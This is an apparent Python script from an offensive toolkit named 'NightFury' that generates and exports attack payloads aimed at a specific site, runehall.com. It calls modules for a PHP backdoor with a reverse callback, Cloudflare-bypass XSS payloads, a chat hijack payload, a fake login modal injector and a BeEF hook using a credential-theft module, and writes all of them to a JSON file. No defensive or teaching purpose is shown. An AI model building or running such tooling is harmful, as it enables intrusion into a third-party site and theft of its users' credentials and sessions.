import sys
import os
import json
import base64

# Add the project root to sys.path to import modules
sys.path.append(os.getcwd())

from modules.exploit_pro.runehall_payloads import RuneHallPayloads
from modules.exploit_pro.xss_generator import XSSGenerator
from modules.exploit_pro.injection_engine import InjectionEngine
from modules.beef_integration.beef_core import BeEFIntegration

def main():
    print("--- NightFury Payload Generation for runehall.com ---")
    
    # 1. RuneHall Specific Payloads
    rh = RuneHallPayloads()
    print("\n[+] RuneHall PHP Backdoor (Callback: 127.0.0.1:4444):")
    print(rh.get_php_backdoor("127.0.0.1", 4444))
    
    print("\n[+] RuneHall Cloudflare-Bypass XSS Payloads:")
    for p in rh.get_cloudflare_xss():
        print(f"  - {p}")
        
    # 2. Injection Engine Payloads
    engine = InjectionEngine()
    print("\n[+] Chat Hijack Payload (Base64):")
    print(engine.overlays['chat_hijack'])
    
    print("\n[+] Login Modal Injector Script:")
    print(engine.get_injector_script("login_modal"))
    
    # 3. Aggressive XSS List
    xss_gen = XSSGenerator()
    print("\n[+] Aggressive XSS Variations (Top 5):")
    for p in xss_gen.generate_aggressive_list()[:5]:
        print(f"  - {p}")
        
    # 4. BeEF Integrated Hook Script
    beef = BeEFIntegration()
    hook_script = beef.generate_hook_script(["pretty_theft", "internal_ip"])
    
    output_file = "data/exports/test_payloads.json"
    results = {
        "php_backdoor": rh.get_php_backdoor("127.0.0.1", 4444),
        "cloudflare_xss": rh.get_cloudflare_xss(),
        "chat_hijack_b64": engine.overlays['chat_hijack'],
        "login_injector": engine.get_injector_script("login_modal"),
        "hook_script": hook_script
    }
    
    with open(output_file, 'w') as f:
        json.dump(results, f, indent=4)
    
    print(f"\n[!] All payloads exported to: {output_file}")

if __name__ == "__main__":
    main()
